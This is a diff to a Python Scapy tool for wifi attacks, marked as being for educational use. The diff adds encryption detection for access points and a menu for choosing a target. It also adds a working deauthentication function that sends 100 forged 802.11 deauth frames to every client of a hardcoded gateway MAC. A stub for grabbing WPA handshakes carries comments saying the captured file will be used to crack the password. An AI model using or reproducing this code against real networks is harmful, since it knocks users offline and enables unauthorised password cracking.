@@ -41,12 +41,13 @@ Use for educational purpose only.
     """)
 
 class AP:
-    def __init__(self,mac,ssid,channel):
+    def __init__(self,mac,ssid,channel,cipher):
         self.mac = mac
         self.ssid = ssid
         self.channel = channel
+        self.cipher = cipher
     def print_ap(self):
-        print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE)
+        print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE + " CIPHER: " + TGREEN + self.cipher + TWHITE)
 
 #######################################
 #           TOOL FUNCTIONS            #
@@ -61,11 +62,11 @@ def signal_handler(signal,frame):
         os.system("ip link set " + interface +" up")
         os.system("NetworkManager")
         print(TGREEN + "done" + TWHITE)
+        sys.exit(1)
     except Exception as e:
         print("Error when disabling monitor mode")
         print(e)
-    sys.exit(1)
-
+        sys.exit(1)
 
 #Handle the ctrl_C signal when the user is sniffing wifi
 def signal_handler2(signal,frame):
@@ -110,14 +111,43 @@ def enable_monitoring(interface_name):
         print("Error when activating monitoring mode:")
         print(e)
 
+
+# Determines the encrytption type of the AP
+def get_encrytion(p):
+
+    enc = []
+
+    if p.subtype != 8:
+        return enc
+
+    packet = p
+    if packet.haslayer(Dot11Elt):
+        packet  = packet[Dot11Elt]
+        while isinstance(packet, Dot11Elt):
+            if packet.ID == 48:
+                enc = "WPA2"
+            elif packet.ID == 221 and packet.info.startswith(b'\x00P\xf2\x01\x01\x00'):
+                enc = "WPA"
+            packet = packet.payload
+
+    if not enc:
+        if (p.FCfield & 0b01000000 != 0):
+            enc = "WEP"
+        else:
+            enc = "OPN"
+
+    return enc
+
+
 #802.11 Packet Handler
 def packet_handler(packet):
     try:
         if packet.addr2 not in ap_list_temp and packet.type == 0 and packet.subtype == 8:
             ssid = str(packet.info)
             mac = str(packet.addr2)
+            cipher = str(get_encrytion(packet))
             channel = int(ord(packet[Dot11Elt:3].info))
-            ap = AP(mac,ssid,channel)
+            ap = AP(mac,ssid,channel,cipher)
             ap_list.append(ap)
             ap_list_temp.append(packet.addr2)
             print("[+] ", end="")
@@ -126,6 +156,7 @@ def packet_handler(packet):
     except Exception as e:
         print("Error getting Access Point information : ")
         print(e)
+
 
 
 #The network sniffer simply hop between channels and sniff the wireless network around the user.
@@ -140,11 +171,28 @@ def network_sniffer():
         time.sleep(1)
 
 
-def launch_handshake_grabber(ap_number):
-    print("TODO")
+def deauth(ap):
+    target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
+    gateway_mac = "e8:94:f6:c4:97:3f"
+    # 802.11 frame
+    # addr1: destination MAC
+    # addr2: source MAC
+    # addr3: Access Point MAC
+    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+    # stack them up
+    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+    # send the packet
+    sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
+
+
+#This function is going to listen for the hanshake and try to capture it.
+#Once it is captured. It will be saved into a pcap file. (use the function wrpcap)
+#The pcap file can then be used to crack the password.
+def grab_handshake(ap):
+    print("Sniffing " + ap.mac + "...")
 
 def handshake_grabber():
-    signal.signal(signal.SIGINT,signal_handler2) #Handle the ctrl+c command
+    signal.signal(signal.SIGINT, signal.SIG_DFL)
     if len(ap_list) == 0:
         print("There is no access point sniffed yet, please start the network sniffer first.")
     else:
@@ -153,6 +201,19 @@ def handshake_grabber():
             print("["+ TGREEN + str(i) + TWHITE + "] ",end="")
             ap.print_ap()
             i = i+1
+        valid = False
+        choice = None
+        while valid == False:
+            try:
+                choice = int(input('Enter the target number:'))
+                valid = True
+                if len(ap_list) < choice or choice < 0:
+                    valid = False
+            except:
+                print("Bad input")
+        if valid == True:
+            grab_handshake(ap_list[choice])
+
 
 #Main menu funtion : The user can choose the module he want to execute.
 def menu():
